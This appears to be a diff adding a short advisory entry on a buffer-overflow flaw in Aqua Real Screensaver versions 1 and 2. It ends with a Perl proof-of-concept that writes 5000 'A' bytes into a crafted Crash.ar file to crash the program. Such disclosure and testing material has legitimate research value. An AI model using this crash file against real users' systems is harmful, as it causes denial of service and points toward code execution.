@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/40606/info
+
+Aqua Real Screensaver is prone to a buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied input.
+
+Successfully exploiting this issue may allow remote attackers to execute arbitrary code in the context of the vulnerable application. Failed attacks will cause denial-of-service conditions.
+
+Aqua Real 1 and 2 are vulnerable; other versions may also be affected. 
+
+#!c/perl/bin/
+my $file= "Crash.ar";
+my $boom="\x41" x 5000;
+open(myfile,'>>Crash.ar') || die "Cannot Creat file\n\n";
+print myfile $boom;
+print "Done..!~#\n";
